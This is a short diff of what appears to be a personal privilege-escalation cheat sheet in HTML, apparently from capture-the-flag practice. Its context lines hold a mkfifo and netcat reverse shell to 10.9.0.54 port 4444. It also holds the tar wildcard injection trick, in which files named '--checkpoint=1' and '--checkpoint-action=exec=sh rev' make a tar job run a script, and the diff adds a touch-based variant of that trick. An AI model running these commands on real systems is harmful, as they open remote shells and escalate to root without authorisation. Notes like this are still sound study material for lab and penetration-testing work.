@@ -223,7 +223,10 @@ mkfifo /tmp/f <br>
 cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.0.54 4444 >/tmp/f <br>
 <br>
 $ echo "" > "/home/andre/backup/--checkpoint=1"
-$ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
+$ echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev" <br>
+OR BETTER WAY <br>
+touch "/home/andre/backup/--checkpoint=1"
+touch "/home/andre/backup/--checkpoint-action=exec=sh rev" <br>
 <br>
 <h2>Cron Jobs with overwrite</h2><br>
 Check file perms of any cron jobs u find (ls -la filename.sh)<br>
